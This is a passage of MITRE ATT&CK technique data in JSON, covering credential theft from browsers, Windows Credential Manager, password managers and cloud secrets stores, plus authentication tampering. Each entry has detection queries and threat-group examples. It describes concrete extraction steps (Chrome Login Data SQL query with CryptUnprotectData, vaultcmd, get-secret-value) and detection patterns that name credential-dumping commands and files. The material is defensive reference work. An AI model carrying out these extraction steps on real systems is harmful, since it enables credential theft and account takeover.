  "T1555.003": {
    "Name": "Credentials from Password Stores:Credentials from Web Browsers",
    "Description": "Adversaries may acquire credentials from web browsers by reading files specific to the target browser.[1]Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.For example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file,AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Dataand executing a SQL query:SELECT action_url, username_value, password_value FROM logins;. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API functionCryptUnprotectData, which uses the victim’s cached logon credentials as the decryption key.[2]Adversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc.[3][4]Windows stores Internet Explorer and Microsoft Edge credentials in Credential Lockers managed by theWindows Credential Manager.Adversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.[5]After acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).",
    "Detects": [
      "Monitor executed commands and arguments that may acquire credentials from web browsers by reading files specific to the target browser.[1]Analytic 1 - Commands indicating credential searches in web browsers.index=security sourcetype IN (\"WinEventLog:Microsoft-Windows-Sysmon/Operational\", \"linux_secure\", \"macos_secure\") event_type=\"process\"(CommandLine IN (\"sqlite3logins\", \"CryptUnprotectData\", \"security find-internet-password\", \"sqlcipherlogins\", \"stringsLogin Data\", \"catLogin Data\", \"catlogins.json\", \"sqlite3signons.sqlite\"))",
      "Identify web browser files that contain credentials such as Google Chrome’s Login Data database file:AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data. Monitor file read events of web browser files that contain credentials, especially when the reading process is unrelated to the subject web browser.Analytic 1 - Unauthorized access to web browser credential files.index=security sourcetype IN (\"WinEventLog:Microsoft-Windows-Sysmon/Operational\", \"linux_secure\", \"macos_secure\") event_type=\"file_open\"((file_path IN (\"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\", \"\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data\", \"\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\\\logins.json\") AND Platform=\"Windows\") OR (file_path IN (\"/home//.mozilla/firefox//logins.json\", \"/home//.config/google-chrome/Default/Login Data\") AND Platform=\"Linux\") OR (file_path IN (\"/Users//Library/Application Support/Google/Chrome/Default/Login Data\", \"/Users//Library/Application Support/Firefox/Profiles//logins.json\") AND Platform=\"macOS\"))",
      "Monitor for API calls that may acquire credentials from web browsers by reading files specific to the target browser.[1]Analytic 1 - Suspicious API calls related to web browser credential access.index=security sourcetype IN (\"WinEventLog:Microsoft-Windows-Sysmon/Operational\", \"linux_secure\", \"macos_secure\") event_type=\"api_call\"(api IN (\"CryptUnprotectData\", \"NSS_Init\", \"PK11SDR_Decrypt\", \"SecItemCopyMatching\", \"SecItemAdd\", \"SecItemUpdate\", \"SecItemDelete\"))",
      "Monitor process execution logs to include PowerShell Transcription focusing on those that perform a combination of behaviors including reading web browser process memory, utilizing regular expressions, and those that contain numerous keywords for common web applications (Gmail, Twitter, Office365, etc.).Analytic 1 - Unauthorized process access indicating credential searches in web browsers.index=security sourcetype IN (\"WinEventLog:Microsoft-Windows-Sysmon/Operational\", \"linux_secure\", \"macos_secure\") event_type=\"process\"(CommandLine IN (\"sqlite3logins\", \"sqlcipherlogins\", \"db-browserLogin Data\", \"db-browserlogins.json\", \"CryptUnprotectData\", \"security find-internet-password\", \"security dump-keychain\", \"stringsLogin Data\", \"catLogin Data\", \"catlogins.json\", \"sqlite3signons.sqlite\"))"
    ],
    "Procedure Examples": [
      "Agent Teslacan gather credentials from a number of browsers.[6]",
      "Ajax Security Teamhas used FireMalv custom-developed malware, which collected passwords from the Firefox browser storage.[7]",
      "APT3has used tools to dump passwords from browsers.[8]",
      "APT33has used a variety of publicly available tools likeLaZagneto gather credentials.[9][10]",
      "APT37has used a credential stealer known as ZUMKONG that can harvest usernames and passwords stored in browsers.[11]",
      "APT41used BrowserGhost, a tool designed to obtain credentials from browsers, to retrieve information from password stores.[12]",
      "APT42has used custom malware to steal credentials.[13]",
      "Azorultcan steal credentials from the victim's browser.[14]",
      "SomeBackdoor.Oldreasamples contain a publicly available Web browser password recovery tool.[15]",
      "BlackEnergyhas used a plug-in to gather credentials from web browsers including FireFox, Google Chrome, and Internet Explorer.[16][17]",
      "BLUELIGHTcan collect passwords stored in web browers, including Internet Explorer, Edge, Chrome, and Naver Whale.[18]",
      "Carberp's passw.plug plugin can gather passwords saved in Opera, Internet Explorer, Safari, Firefox, and Chrome.[19]",
      "Chaescan steal login credentials and stored financial information from the browser.[20]",
      "ChChessteals credentials stored inside Internet Explorer.[21]",
      "CookieMinercan steal saved usernames and passwords in Chrome as well as credit card credentials.[22]",
      "CosmicDukecollects user credentials, including passwords, for various programs including Web browsers.[23]",
      "Crimsoncontains a module to steal credentials from Web browsers on the victim machine.[24][25]",
      "Emotethas been observed dropping browser password grabber modules.[26][27]",
      "Empirecan use modules that extract passwords from common web browsers such as Firefox and Chrome.[28]",
      "FIN6has used the Stealer One credential stealer to target web browsers.[29]",
      "Grandoreirocan steal cookie data and credentials from Google Chrome.[30][31]",
      "H1N1dumps usernames and passwords from Firefox, Internet Explorer, and Outlook.[32]",
      "HEXANEhas used aMimikatz-based tool and a PowerShell script to steal passwords from Google Chrome.[33]",
      "Imminent Monitorhas a PasswordRecoveryPacket module for recovering browser passwords.[34]",
      "Inceptionused a browser plugin to steal passwords and sessions from Internet Explorer, Chrome, Opera, Firefox, Torch, and Yandex.[35]",
      "Javalican capture login credentials from open browsers including Firefox, Chrome, Internet Explorer, and Edge.[36]",
      "jRATcan capture passwords from common web browsers such as Internet Explorer, Google Chrome, and Firefox.[37]",
      "DuringJuicy Mix,OilRigused the CDumper (Chrome browser) and EDumper (Edge browser) to collect credentials.[38]",
      "KeyBoyattempts to collect passwords from browsers.[39]",
      "KGH_SPYhas the ability to steal data from the Chrome, Edge, Firefox, Thunderbird, and Opera browsers.[40]",
      "Kimsukyhas used browser extensions including Google Chrome to steal passwords and cookies from browsers.Kimsukyhas also used Nirsoft's WebBrowserPassView tool to dump the passwords obtained from victims.[41][42][43][44]",
      "KONNIcan steal profiles (containing credential information) from Firefox, Chrome, and Opera.[45]",
      "LAPSUS$has obtained passwords and session tokens with the use of the Redline password stealer.[46]",
      "LaZagnecan obtain credentials from web browsers such as Google Chrome, Internet Explorer, and Firefox.[47]",
      "Leafminerused several tools for retrieving login and password information, including LaZagne.[48]",
      "Lizarhas a module to collect usernames and passwords stored in browsers.[49]",
      "Lokibothas demonstrated the ability to steal credentials from multiple applications and data sources including Safari and the Chromium and Mozilla Firefox-based web browsers.[50]",
      "Lumma Stealerhas gathered credential and other information from multiple browsers.[51][52][53]",
      "Machetecollects stored credentials from several web browsers.[54]",
      "Malteirohas stolen credentials stored in the victim’s browsers via software tool NirSoft WebBrowserPassView.[55]",
      "Manjusakagathers credentials from Chromium-based browsers.[56]",
      "Melcozhas the ability to steal credentials from web browsers.[36]",
      "MgBotincludes modules for stealing credentials from various browsers and applications, including Chrome, Opera, Firefox, Foxmail, QQBrowser, FileZilla, and WinSCP.[57][58]",
      "Mimikatzperforms credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from DPAPI.[59][60][61][62]",
      "Mispaducan steal credentials from Google Chrome.[55][63][64]",
      "Moleratsused the public tool BrowserPasswordDump10 to dump passwords saved in browsers on victims.[65]",
      "MuddyWaterhas run tools including Browser64 to steal passwords saved in victim web browsers.[66][67]",
      "NETWIREhas the ability to steal credentials from web browsers including Internet Explorer, Opera, Yandex, and Chrome.[68][69][70]",
      "njRAThas a module that steals passwords saved in victim web browsers.[71][72][73]",
      "OilRighas used credential dumping tools such asLaZagneto steal credentials to accounts logged into the compromised system and to Outlook Web Access.[74][75][76][77]OilRighas also used tool named PICKPOCKET to dump passwords from web browsers.[77]",
      "OLDBAITcollects credentials from Internet Explorer, Mozilla Firefox, and Eudora.[78]",
      "Olympic Destroyercontains a module that tries to obtain stored credentials from web browsers.[1]",
      "Patchworkdumped the login data database from\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data.[79]",
      "PinchDukesteals credentials from compromised hosts.PinchDuke's credential stealing functionality is believed to be based on the source code of the Pinch credential stealing malware (also known as LdPinch). Credentials targeted byPinchDukeinclude ones associated with many sources such as Netscape Navigator, Mozilla Firefox, Mozilla Thunderbird, and Internet Explorer.[23]",
      "PLEADcan harvest saved credentials from browsers such as Google Chrome, Microsoft Internet Explorer, and Mozilla Firefox.[80][81]",
      "PoetRAThas used a Python tool named Browdec.exe to steal browser credentials.[82]",
      "A module inPrikormkagathers logins and passwords stored in applications on the victims, including Google Chrome, Mozilla Firefox, and several other browsers.[83]",
      "Protongathers credentials for Google Chrome.[84]",
      "Pupycan use Lazagne for harvesting credentials.[85]",
      "QakBothas collected usernames and passwords from Firefox and Chrome.[86]",
      "QuasarRATcan obtain passwords from common web browsers.[87][88]",
      "Raccoon Stealercollects passwords, cookies, and autocomplete information from various popular web browsers.[89]",
      "RainyDaycan use tools to collect credentials from web browsers.[90]",
      "RedCurlusedLaZagneto obtain passwords from web browsers.[91][92]",
      "RedLeavescan gather browser usernames and passwords.[93]",
      "ROKRATcan steal credentials stored in Web browsers by querying the sqlite database.[94]",
      "Sandworm Team's CredRaptor tool can collect saved passwords from various internet browsers.[95]",
      "SILENTTRINITYcan collect clear text web credentials for Internet Explorer/Edge.[96]",
      "Smoke Loadersearches for credentials stored from web browsers.[97]",
      "During theSolarWinds Compromise,APT29stole users' saved passwords from Chrome.[98]",
      "Stealth Falconmalware gathers passwords from multiple sources, including Internet Explorer, Firefox, and Chrome.[99]",
      "SUGARDUMPvariants have harvested credentials from browsers such as Firefox, Chrome, Opera, and Edge.[100]",
      "TA505has used malware to gather credentials from Internet Explorer.[101]",
      "TRANSLATEXThas stolen credentials stored in Chrome.[102]",
      "TrickBotcan obtain passwords stored in files from web browsers such as Chrome, Firefox, Internet Explorer, and Microsoft Edge, sometimes usingesentutl.[103][104][105]",
      "Trojan.Karaganycan steal data and credentials from browsers.[106]",
      "TSCookiehas the ability to steal saved passwords from the Internet Explorer, Edge, Firefox, and Chrome browsers.[107]",
      "Unknown Loggeris capable of stealing usernames and passwords from browsers on the victim machine.[108]",
      "Volt Typhoonhas targeted network administrator browser data including browsing history and stored credentials.[109]",
      "WarzoneRAThas the capability to grab passwords from numerous web browsers as well as from Outlook and Thunderbird email clients.[110][111]",
      "XAgentOSXcontains the getFirefoxPassword function to attempt to locate Firefox passwords.[112]",
      "XLoadercan gather credentials from several web browsers.[113][114][115]",
      "Zebrocyhas the capability to upload dumper tools that extract credentials from web browsers and store them in database files.[116]",
      "ZIRCONIUMhas used a tool to steal credentials from installed web browsers including Microsoft Internet Explorer and Google Chrome.[117]"
    ]
  },
  "T1555.004": {
    "Name": "Credentials from Password Stores:Windows Credential Manager",
    "Description": "Adversaries may acquire credentials from the Windows Credential Manager. The Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos in Credential Lockers (previously known as Windows Vaults).[1][2]The Windows Credential Manager separates website credentials from application or network credentials in two lockers. As part ofCredentials from Web Browsers, Internet Explorer and Microsoft Edge website credentials are managed by the Credential Manager and are stored in the Web Credentials locker. Application and network credentials are stored in the Windows Credentials locker.Credential Lockers store credentials in encrypted.vcrdfiles, located under%Systemdrive%\\Users\\\\[Username]\\AppData\\Local\\Microsoft\\\\[Vault/Credentials]\\. The encryption key can be found in a file namedPolicy.vpol, typically located in the same folder as the credentials.[3][4]Adversaries may list credentials managed by the Windows Credential Manager through several mechanisms.vaultcmd.exeis a native Windows executable that can be used to enumerate credentials stored in the Credential Locker through a command-line interface. Adversaries may also gather credentials by directly reading files located inside of the Credential Lockers. Windows APIs, such asCredEnumerateA, may also be absued to list credentials managed by the Credential Manager.[5][6]Adversaries may also obtain credentials from credential backups. Credential backups and restorations may be performed by runningrundll32.exe keymgr.dll KRShowKeyMgrthen selecting the \"Back up...\" button on the \"Stored User Names and Passwords\" GUI.Password recovery tools may also obtain plain text passwords from the Credential Manager.[4]",
    "Detects": [
      "Monitor executed commands and arguments for suspicious activity listing credentials from the Windows Credentials locker (e.g.vaultcmd /listcreds:\"Windows Credentials\").[4]Analytic 1 - Commands indicating credential searches in Windows Credential Manager.index=security sourcetype=\"Powershell\" EventCode=4104(CommandLine IN (\"vaultcmd.exe\", \"rundll32.exe keymgr.dll KRShowKeyMgr\"))",
      "Consider monitoring file reads to Vault locations,%Systemdrive%\\Users\\\\[Username]\\AppData\\Local\\Microsoft\\\\[Vault/Credentials]\\, for suspicious activity.[4]Analytic 1 - Unauthorized access to Windows Vault credential files.index=security sourcetype=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" event_type=\"file_access\"(file_path IN (\"%SystemDrive%\\Users\\\\AppData\\Local\\Microsoft\\Vault\\\\.vcrd\", \"%SystemDrive%\\Users\\\\AppData\\Local\\Microsoft\\Credentials\\\\.vcrd\", \"%SystemDrive%\\Users\\\\AppData\\Local\\Microsoft\\Vault\\\\Policy.vpol\", \"%SystemDrive%\\Users\\\\AppData\\Local\\Microsoft\\Credentials\\\\Policy.vpol\"))",
      "Consider monitoring API calls such asCredEnumerateAthat may list credentials from the Windows Credential Manager.[5][6]Analytic 1 - Suspicious API calls related to Windows Credential Manager access.index=security sourcetype=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" event_type=\"api_call\"(api IN (\"CredEnumerateA\", \"CredEnumerateW\", \"CredReadA\", \"CredReadW\", \"CryptUnprotectData\"))",
      "Monitor newly executed processes for suspicious activity listing credentials from the Windows Credentials locker (e.g.vaultcmd /listcreds:\"Windows Credentials\").[4]Analytic 1 - New processes with parameters indicating credential searches in Windows Credential Manager.index=security sourcetype=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=1(CommandLine IN (\"vaultcmd.exe\", \"rundll32.exe keymgr.dll KRShowKeyMgr\"))"
    ],
    "Procedure Examples": [
      "DuringJuicy Mix,OilRigused a Windows Credential Manager stealer for credential access.[7]",
      "KGH_SPYcan collect credentials from the Windows Credential Manager.[8]",
      "LaZagnecan obtain credentials from Vault files.[9]",
      "Lizarhas a plugin that can retrieve credentials from Internet Explorer and Microsoft Edge usingvaultcmd.exeand another that can collect RDP access credentials using theCredEnumerateWfunction.[10]",
      "Mimikatzcontains functionality to acquire credentials from the Windows Credential Manager.[6]",
      "OilRighas used credential dumping tool named VALUEVAULT to steal credentials from the Windows Credential Manager.[11]",
      "PowerSploitcontains a collection of Exfiltration modules that can harvest credentials from Windows vault credential objects.[12][13]",
      "RainyDaycan use the QuarksPwDump tool to obtain local passwords and domain cached credentials.[14]",
      "ROKRATcan steal credentials by leveraging the Windows Vault mechanism.[15]",
      "SILENTTRINITYcan gather Windows Vault credentials.[16]",
      "Stealth Falconmalware gathers passwords from the Windows Credential Vault.[17]",
      "Turlahas gathered credentials from the Windows Credential Manager tool.[18]",
      "Valakcan use a .NET compiled module named exchgrabber to enumerate credentials from the Credential Manager.[19]",
      "Wizard Spiderhas used PowerShell cmdletInvoke-WCMDumpto enumerate Windows credentials in the Credential Manager in a compromised network.[20]"
    ]
  },
  "T1555.005": {
    "Name": "Credentials from Password Stores:Password Managers",
    "Description": "Adversaries may acquire user credentials from third-party password managers.[1]Password managers are applications designed to store user credentials, normally in an encrypted database. Credentials are typically accessible after a user provides a master password that unlocks the database. After the database is unlocked, these credentials may be copied to memory. These databases can be stored as files on disk.[1]Adversaries may acquire user credentials from password managers by extracting the master password and/or plain-text credentials from memory.[2][3]Adversaries may extract credentials from memory viaExploitation for Credential Access.[4]Adversaries may also try brute forcing viaPassword Guessingto obtain the master password of a password manager.[5]",
    "Detects": [
      "Monitor executed commands and arguments that may acquire user credentials from third-party password managers.[1]Analytic 1 - Commands indicating credential searches in password managers.index=security sourcetype IN (\"linux_secure\", \"macos_secure\")(CommandLine IN (\"keepass\", \"lastpass\", \"1password\", \"bitwarden\", \"dashlane\", \"passwordsafe\", \"login\", \"vault\"))",
      "Monitor file reads that may acquire user credentials from third-party password managers.[1]Analytic 1 - Unauthorized access to password manager files.index=security sourcetype IN (\"WinEventLog:Microsoft-Windows-Sysmon/Operational\", \"linux_secure\", \"macos_secure\") EventCode IN (1, 4663)(file_path IN (\"\\AppData\\Local\\Keepass\\.kdbx\", \"\\AppData\\Local\\LastPass\\.lpvault\", \"\\AppData\\Local\\1Password\\.agilekeychain\", \"\\AppData\\Local\\Bitwarden\\.json\", \"\\AppData\\Local\\Dashlane\\.db\", \"\\AppData\\Local\\PasswordSafe\\.psafe3\", \"/home//.keepass/.kdbx\", \"/home//.lastpass/.lpvault\", \"/home//.1password/.agilekeychain\", \"/home//.bitwarden/.json\", \"/home//.dashlane/.db\", \"/home//.passwordsafe/.psafe3\"))",
      "Monitor for API calls that may search for common password storage locations to obtain user credentials.Analytic 1 - Suspicious API calls related to password manager access.index=security sourcetype IN (\"WinEventLog:Microsoft-Windows-Sysmon/Operational\", \"linux_secure\", \"macos_secure\") EventCode IN (1, 11, 4688)(api IN (\"CryptUnprotectData\", \"OpenProcess\", \"ReadProcessMemory\", \"EnumProcesses\", \"EnumProcessModules\") OR CommandLine IN (\"keepass\", \"lastpass\", \"1password\", \"bitwarden\", \"dashlane\", \"passwordsafe\"))",
      "Monitor process being accessed that may acquire user credentials from third-party password managers.[1]Analytic 1 - Unauthorized process access indicating credential searches in password managers.index=security sourcetype IN (\"WinEventLog:Microsoft-Windows-Sysmon/Operational\", \"linux_secure\", \"macos_secure\") EventCode IN (1, 10, 11)(Image IN (\"keepass\", \"lastpass\", \"1password\", \"bitwarden\", \"dashlane\", \"passwordsafe\") OR TargetImage IN (\"keepass\", \"lastpass\", \"1password\", \"bitwarden\", \"dashlane\", \"passwordsafe\"))"
    ],
    "Procedure Examples": [
      "Fox Kittenhas used scripts to access credential information from the KeePass database.[6]",
      "Indrik Spiderhas accessed and exported passwords from password managers.[7]",
      "LAPSUS$has accessed local password managers and databases to obtain further credentials from a compromised network.[8]",
      "MarkiRATcan gather information from the Keepass password manager.[9]",
      "DuringOperation Wocao, threat actors accessed and collected credentials from password managers.[2]",
      "Protongathers credentials in files for 1password.[10]",
      "Threat Group-3390obtained a KeePass database from a compromised host.[11]",
      "TrickBotcan steal passwords from the KeePass open source password manager.[5]"
    ]
  },
  "T1555.006": {
    "Name": "Credentials from Password Stores:Cloud Secrets Management Stores",
    "Description": "Adversaries may acquire credentials from cloud-native secret management solutions such as AWS Secrets Manager, GCP Secret Manager, Azure Key Vault, and Terraform Vault.Secrets managers support the secure centralized management of passwords, API keys, and other credential material. Where secrets managers are in use, cloud services can dynamically acquire credentials via API requests rather than accessing secrets insecurely stored in plain text files or environment variables.If an adversary is able to gain sufficient privileges in a cloud environment – for example, by obtaining the credentials of high-privilegedCloud Accountsor compromising a service that has permission to retrieve secrets – they may be able to request secrets from the secrets manager. This can be accomplished via commands such asget-secret-valuein AWS,gcloud secrets describein GCP, andaz key vault secret showin Azure.[1][2][3][4][5]Note:this technique is distinct fromCloud Instance Metadata APIin that the credentials are being directly requested from the cloud secrets manager, rather than through the medium of the instance metadata API.",
    "Detects": [
      "Monitor for API calls and CLI commands that attempt to enumerate and fetch credential material from the secrets manager, such asget-secret-valuein AWS,gcloud secrets describein GCP, andaz key vault secret showin Azure. Alert on any suspicious usages of these commands, such as an account or service generating an unusually high number of secret requests.Analytic 1 - High volume of secret requests from unusual accounts or services.index=cloud_logs sourcetype IN (\"aws:cloudtrail\", \"gcp:logging\", \"azure:activity\")(eventName IN (\"GetSecretValue\", \"gcloud secrets describe\", \"az key vault secret show\"))| eval User=coalesce(userIdentity.arn, protoPayload.authenticationInfo.principalEmail, claims.user)| eval Service=coalesce(eventSource, protoPayload.serviceName, claims.aud)| eval AccountType=case(    match(User, \"root|admin|superuser\"), \"High-Privilege\",    match(User, \"serviceaccount|svc|automation\"), \"Service-Account\",    true(), \"Standard-User\")| eval Platform=case(    sourcetype==\"aws:cloudtrail\", \"AWS\",    sourcetype==\"gcp:logging\", \"GCP\",    sourcetype==\"azure:activity\", \"Azure\",    true(), \"Unknown\")| where AccountType != \"High-Privilege\"Analytic 2 - Cloud Service Enumerationindex=cloud_logs sourcetype IN (\"aws:cloudtrail\", \"gcp:logging\", \"azure:activity\") | search (sourcetype=\"aws:cloudtrail\" eventName=\"GetSecretValue\"           OR sourcetype=\"gcp:pubsub:message\" methodName=\"google.iam.credentials.v1.*\"           OR sourcetype=\"azure:eventhub\" operationName=\"Microsoft.KeyVault/vaults/secrets/read\")"
    ],
    "Procedure Examples": [
      "HAFNIUMhas moved laterally from on-premises environments to steal passwords from Azure key vaults.[6]",
      "Pacucan retrieve secrets from the AWS Secrets Manager via the enum_secrets module.[7]"
    ]
  },
  "T1556": {
    "Name": "Modify Authentication Process",
    "Description": "Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without usingValid Accounts.Adversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.",
    "Detects": [
      "Monitor for changes made to AD security settings related to MFA logon requirements, such as changes to Azure AD Conditional Access Policies or the registration of new MFA applications.Monitor for changes made to security settings related to Azure AD Conditional Access Policies. These can be found in the Azure AD audit log under the operation nameUpdate Conditional Access policy.[14]Analytic 1 - Changes to AD security settings outside of normal maintenance windows.index=security sourcetype IN (\"WinEventLog:Security\", \"azure:activity\", \"gsuite:reports:activity\", \"aws:cloudtrail\", \"linux_audit\", \"macos_secure\", \"network_logs\")(EventCode IN (4670, 5136, 5137, 5139, 5141) OR eventName IN (\"UpdateUser\", \"UpdateGroup\", \"UpdatePolicy\", \"UpdateRole\", \"PutRolePolicy\", \"AttachUserPolicy\", \"AttachGroupPolicy\", \"AttachRolePolicy\") OR \"protoPayload.methodName\" IN (\"directory.users.update\", \"admin.directory.group.update\", \"admin.directory.roleAssignments.update\"))",
      "Enable security auditing to collect logs from hybrid identity solutions. For example, monitor sign-ins to the Entra ID Application Proxy Connector, which are typically generated only when a new Pass Through Authentication (PTA) Agent is added.[6]If AD FS is in use, review the logs for event ID 501, which specifies all EKU attributes on a claim, and raise alerts on any values that are not configured in your environment.[7]Analytic 1 - Unexpected sign-ins or new PTA Agent additions.index=third_party_logs sourcetype IN (\"azure:activity\", \"gsuite:reports:activity\", \"aws:cloudtrail\", \"office365:management\", \"saas_audit\")(eventName IN (\"AddServicePrincipal\", \"AddUser\", \"UpdateUser\", \"AddGroup\", \"UpdateGroup\", \"AddPolicy\", \"UpdatePolicy\", \"AddRole\", \"UpdateRole\", \"PutRolePolicy\", \"AttachUserPolicy\", \"AttachGroupPolicy\", \"AttachRolePolicy\") OR eventCategory IN (\"Sign-ins\", \"Security\", \"AuditLogs\") OR EventID IN (501, 4662) OR \"protoPayload.methodName\" IN (\"directory.users.update\", \"admin.directory.group.update\", \"admin.directory.roleAssignments.update\"))",
      "Monitor for changes made to conditional access policies used by SaaS identity providers and internal IaaS identity and access management systems.Analytic 1 - Changes to access policies without corresponding change requests.index=cloud_logs sourcetype IN (\"azure:activity\", \"gsuite:reports:activity\", \"aws:cloudtrail\", \"office365:management\", \"saas_audit\")(eventName IN (\"UpdateServicePrincipal\", \"UpdateUser\", \"UpdateGroup\", \"UpdatePolicy\", \"UpdateRole\", \"PutRolePolicy\", \"AttachUserPolicy\", \"AttachGroupPolicy\", \"AttachRolePolicy\", \"ModifyAuthenticationMethod\") OR protoPayload.methodName IN (\"directory.users.update\", \"admin.directory.group.update\", \"admin.directory.roleAssignments.update\", \"Set-AzureADApplicationProxyConnector\", \"Update-PassThroughAuthentication\") OR (eventName=\"Sign-in\" AND targetResourceType=\"applicationProxyConnector\"))",
      "Monitor for suspicious additions to the/Library/Security/SecurityAgentPluginsdirectory.[15]Monitor for newly created files that may be used to register malicious network provider dynamic link libraries (DLLs).Analytic 1 - Unauthorized file creation in critical directories.index=security sourcetype IN (\"WinEventLog:Security\", \"wineventlog:sysmon\", \"linux_audit\", \"macos_secure\")(EventCode=4663 OR EventCode=11 OR EventCode=13 OR (sourcetype=\"linux_audit\" AND (syscall=\"creat\" OR syscall=\"open\" OR syscall=\"openat\")) OR (sourcetype=\"macos_secure\" AND action=\"file_write\"))| eval TargetFile=coalesce(ObjectName, FileName, target_file)| search TargetFile IN (    \"C:\\Windows\\System32\\config\\SAM\",    \"C:\\Windows\\System32\\config\\system\",    \"C:\\Windows\\System32\\config\\security\",    \"C:\\Windows\\System32\\lsass.exe\",    \"/etc/passwd\",    \"/etc/shadow\",    \"/etc/pam.d/\",    \"/Library/Preferences/com.apple.loginwindow.plist\")",
      "Monitor for suspicious modification of files associated with authentication processes, such as configuration files and module paths (e.g./etc/pam.d/). Use system-integrity tools such as AIDE and monitoring tools such as auditd to monitor PAM files. Also monitor for access to certificates and cryptographic keys material.Analytic 1 - Unauthorized modifications to authentication-related files.index=security sourcetype IN (\"WinEventLog:Security\", \"WinEventLog:Microsoft-Windows-Sysmon/Operational\", \"linux_audit\", \"macos_secure\")(EventCode=4663 OR EventCode=11 OR EventCode=13 OR (sourcetype=\"linux_audit\" AND (syscall IN (\"creat\", \"open\", \"openat\", \"write\", \"chmod\", \"chown\", \"unlink\"))) OR (sourcetype=\"macos_secure\" AND action=\"file_write\"))| eval TargetFile=coalesce(ObjectName, FileName, target_file)| search TargetFile IN (    \"C:\\Windows\\System32\\config\\SAM\",    \"C:\\Windows\\System32\\config\\system\",    \"C:\\Windows\\System32\\config\\security\",    \"C:\\Windows\\System32\\lsass.exe\",    \"C:\\Windows\\System32\\Drivers\\etc\\hosts\",    \"/etc/passwd\",    \"/etc/shadow\",    \"/etc/pam.d/\",    \"/etc/security/\",    \"/etc/sshd_config\",    \"/etc/ssh/sshd_config\",    \"/Library/Preferences/com.apple.loginwindow.plist\",    \"/Library/Security/authorization\",    \"/etc/krb5.conf\",    \"/etc/krb5.keytab\",    \"/etc/pam.conf\",    \"/etc/security/access.conf\",    \"/etc/security/limits.conf\",    \"/etc/security/namespace.conf\",    \"/etc/security/sepermit.conf\",    \"/etc/security/time.conf\")| eval User=coalesce(Account_Name, user, uid, user_name)| eval Platform=case(    sourcetype==\"WinEventLog:Security\", \"Windows\",    sourcetype==\"wineventlog:sysmon\", \"Windows\",    sourcetype==\"linux_audit\", \"Linux\",    sourcetype==\"macos_secure\", \"macOS\",    true(), \"Unknown\")",
      "Monitor for newly constructed logon behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times (ex: when the user is not present) or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access). Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services.[16]Analytic 1 - Unusual logon patterns and times.index=security sourcetype IN (\"WinEventLog:Security\", \"linux_secure\", \"macos_secure\")(EventCode=4624 OR EventCode=4625 OR EventCode=4768 OR EventCode=4769 OR EventCode=4776 OR EventCode=4778 OR EventCode=4779 OR EventCode=5379 OR EventCode=22)| eval LogonType=case(    EventCode==4624, \"Logon\",    EventCode==4625, \"Failed Logon\",    EventCode IN (4768, 4769), \"Kerberos\",    EventCode==4776, \"NTLM\",    EventCode==4778, \"Session Reconnected\",    EventCode==4779, \"Session Disconnected\",    EventCode==5379, \"Login Attempt\",    EventCode==22, \"Interactive Logon\",    true(), \"Other\")| eval User=coalesce(user, UserName, Account_Name, user_name)| eval System=coalesce(ComputerName, host)| eval Platform=case(    sourcetype==\"WinEventLog:Security\", \"Windows\",    sourcetype==\"linux_secure\", \"Linux\",    sourcetype==\"macos_secure\", \"macOS\",    true(), \"Unknown\")| where (date_wday!=\"saturday\" AND date_wday!=\"sunday\") AND (date_hour<9 OR date_hour>17)| bin _time span=1m| stats earliest(_time) as first_time, latest(_time) as last_time, count by User, System, LogonType, Platform| eval duration=last_time-first_time| where (LogonType=\"Logon\" AND duration<60 AND count > 1) OR (LogonType=\"Failed Logon\" AND count > 5)| eval isOddTime=if(date_hour<9 OR date_hour>17, \"Yes\", \"No\")| eval isMultipleSystems=if(count>1, \"Yes\", \"No\")| table first_time, last_time, duration, User, System, LogonType, Platform, count, isOddTime, isMultipleSystems| sort -count",
